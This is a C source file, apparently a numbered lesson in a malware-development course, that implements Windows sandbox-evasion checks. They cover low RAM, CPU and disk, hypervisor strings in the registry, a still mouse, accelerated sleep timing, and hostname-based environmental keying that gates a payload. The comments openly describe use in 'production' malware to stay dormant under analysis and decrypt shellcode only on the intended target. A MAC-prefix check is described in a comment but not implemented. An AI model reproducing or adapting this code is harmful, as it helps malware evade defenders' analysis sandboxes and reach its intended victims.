/*
 * 09_sandbox_evasion.c
 * =====================
 * Sandbox Evasion Techniques
 *
 * Sandboxes are virtualized environments that run malware to analyze
 * behavior. They are usually VMs with limited hardware, no real
 * human interaction, and limited analysis time (30s to 5min).
 *
 * These techniques detect if we're in a sandbox and, if so,
 * don't execute the payload (stay dormant or simulate being legitimate).
 *
 * Compile: cl.exe /O2 09_sandbox_evasion.c
 */

#include <windows.h>
#include <stdio.h>

/* ---------------------------------------------------------------
 * checkResources - Verifies if the hardware looks real
 *
 * VMs and sandboxes usually have:
 *   - Low RAM (1-2 GB)
 *   - Few CPUs (1 core)
 *   - Small disk (40-60 GB)
 *
 * A real desktop machine has at least 4GB RAM and 2 cores.
 * If resources are too low, it's probably a sandbox.
 * --------------------------------------------------------------- */
BOOL checkResources() {

    printf("[*] Checking hardware resources...\n");

    /*
     * MEMORYSTATUSEX contains system memory information.
     * GlobalMemoryStatusEx fills the struct with current data.
     * ullTotalPhys = total physical RAM in bytes.
     */
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(memInfo); /* mandatory to set the size */
    GlobalMemoryStatusEx(&memInfo);

    DWORD ramGB = (DWORD)(memInfo.ullTotalPhys / (1024 * 1024 * 1024));
    printf("    RAM: %lu GB\n", ramGB);

    if (ramGB < 4) {
        printf("    [!] RAM too low - possible sandbox\n");
        return TRUE; /* suspicious */
    }

    /*
     * SYSTEM_INFO contains processor information.
     * dwNumberOfProcessors = number of logical CPUs.
     */
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    printf("    CPUs: %lu\n", sysInfo.dwNumberOfProcessors);

    if (sysInfo.dwNumberOfProcessors < 2) {
        printf("    [!] Only 1 CPU - possible sandbox\n");
        return TRUE;
    }

    /*
     * GetDiskFreeSpaceExA returns disk space.
     * Sandboxes usually have small disks (40-60 GB).
     */
    ULARGE_INTEGER totalSpace;
    GetDiskFreeSpaceExA("C:\\", NULL, &totalSpace, NULL);

    DWORD diskGB = (DWORD)(totalSpace.QuadPart / (1024 * 1024 * 1024));
    printf("    Disk C: %lu GB\n", diskGB);

    if (diskGB < 80) {
        printf("    [!] Small disk - possible sandbox\n");
        return TRUE;
    }

    printf("    [+] Resources look real\n");
    return FALSE;
}


/* ---------------------------------------------------------------
 * checkVM - Detects hypervisors via Registry and WMI strings
 *
 * VMs leave traces in various registry keys and system properties:
 * BIOS manufacturer name, computer model, etc.
 *
 * VMware, VirtualBox, Hyper-V and QEMU all have distinct signatures.
 * --------------------------------------------------------------- */
BOOL checkVM() {

    printf("\n[*] Checking VM indicators...\n");

    /*
     * HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Disk\Enum
     * Contains the virtual disk name. In VMs it shows "VBOX", "VMware", etc.
     *
     * RegOpenKeyExA opens a registry key.
     * RegQueryValueExA reads the value of an entry.
     *
     * HKEY = handle to a registry key (like a folder)
     * KEY_READ = read-only permission
     */
    HKEY hKey;
    char value[256] = { 0 };
    DWORD size = sizeof(value);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        if (RegQueryValueExA(hKey, "0", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            printf("    Disk: %s\n", value);

            /* Check if it contains known hypervisor strings */
            if (strstr(value, "VBOX") || strstr(value, "vbox")) {
                printf("    [!] VirtualBox detected!\n");
                RegCloseKey(hKey);
                return TRUE;
            }
            if (strstr(value, "VMware") || strstr(value, "vmware")) {
                printf("    [!] VMware detected!\n");
                RegCloseKey(hKey);
                return TRUE;
            }
            if (strstr(value, "QEMU") || strstr(value, "qemu")) {
                printf("    [!] QEMU detected!\n");
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }

    /*
     * Check MAC address - hypervisors have known prefixes:
     *   00:0C:29 = VMware
     *   08:00:27 = VirtualBox
     *   00:15:5D = Hyper-V
     *   00:16:3E = Xen
     *
     * Here we check via the network interface registry key.
     */
    printf("    [+] No VM detected via registry\n");
    return FALSE;
}


/* ---------------------------------------------------------------
 * checkHumanInteraction - Verifies if someone is using the computer
 *
 * Sandboxes don't simulate real usage: mouse doesn't move, there aren't
 * many open windows, clipboard is empty.
 *
 * Real humans move the mouse, have multiple windows open, type.
 * --------------------------------------------------------------- */
BOOL checkHumanInteraction() {

    printf("\n[*] Checking human interaction...\n");

    /*
     * GetCursorPos returns the current mouse position.
     * We get two positions with a 2-second interval.
     * If the mouse didn't move, it's probably a sandbox.
     *
     * POINT is a struct with x and y (cursor coordinates).
     */
    POINT position1, position2;
    GetCursorPos(&position1);

    printf("    Mouse position 1: (%ld, %ld)\n", position1.x, position1.y);
    printf("    Waiting 2 seconds...\n");

    Sleep(2000);

    GetCursorPos(&position2);
    printf("    Mouse position 2: (%ld, %ld)\n", position2.x, position2.y);

    if (position1.x == position2.x && position1.y == position2.y) {
        printf("    [!] Mouse didn't move - possible sandbox\n");
        return TRUE;
    }

    printf("    [+] Mouse moved - probably a real human\n");
    return FALSE;
}


/* ---------------------------------------------------------------
 * checkTiming - Detects time acceleration
 *
 * Sandboxes frequently "accelerate" time to finish the
 * analysis faster. If Sleep(3000) returns in less than 2.5s,
 * the time is being manipulated.
 *
 * GetTickCount64 returns the time since boot in milliseconds.
 * --------------------------------------------------------------- */
BOOL checkTiming() {

    printf("\n[*] Checking time integrity...\n");

    ULONGLONG before = GetTickCount64();
    Sleep(3000); /* sleep 3 seconds */
    ULONGLONG after = GetTickCount64();

    ULONGLONG duration = after - before;
    printf("    Sleep(3000) lasted: %llu ms\n", duration);

    /*
     * If it lasted less than 2500ms, time was accelerated.
     * 500ms margin for OS scheduling.
     */
    if (duration < 2500) {
        printf("    [!] Time accelerated! Sandbox detected.\n");
        return TRUE;
    }

    printf("    [+] Time looks normal\n");
    return FALSE;
}


/* ---------------------------------------------------------------
 * environmentalKeying - Decrypts payload only on the correct target
 *
 * The idea: the payload only works on the target machine.
 * We use the hostname (or username, domain, SID) as part of the key.
 * In the sandbox, the hostname is different -> wrong key -> payload
 * doesn't decrypt -> looks harmless.
 * --------------------------------------------------------------- */
BOOL environmentalKeying() {

    printf("\n[*] Environmental Keying...\n");

    char hostname[256] = { 0 };
    DWORD size = sizeof(hostname);

    /*
     * GetComputerNameA returns the computer name.
     * In production, you would use this to derive the AES key:
     *   key = SHA256(hostname + salt)
     * If the hostname doesn't match, the key is different and the
     * decrypted shellcode becomes garbage (doesn't execute).
     */
    GetComputerNameA(hostname, &size);
    printf("    Hostname: %s\n", hostname);

    /* Expected target (hardcoded at compile time) */
    const char* expectedTarget = "TARGET-WORKSTATION";

    if (strcmp(hostname, expectedTarget) != 0) {
        printf("    [!] Not the correct target. Payload will not execute.\n");
        printf("    [*] In the sandbox, this makes the malware look harmless.\n");
        return FALSE;
    }

    printf("    [+] Target confirmed! Payload would execute.\n");
    return TRUE;
}


int main() {

    printf("===========================================\n");
    printf("  Sandbox Evasion Techniques\n");
    printf("===========================================\n\n");

    int suspiciousScore = 0;

    if (checkResources())        suspiciousScore++;
    if (checkVM())               suspiciousScore++;
    if (checkHumanInteraction()) suspiciousScore++;
    if (checkTiming())           suspiciousScore++;

    environmentalKeying();

    printf("\n===========================================\n");
    printf("  Result: %d/4 checks positive\n", suspiciousScore);
    printf("===========================================\n");

    if (suspiciousScore >= 2) {
        printf("\n[!] PROBABLY SANDBOX - payload will NOT execute.\n");
        printf("[*] In production: the malware would pretend to be legitimate\n");
        printf("    (open a document, show a fake error, etc)\n");
    } else {
        printf("\n[+] Environment looks real - payload WOULD execute.\n");
    }

    return 0;
}
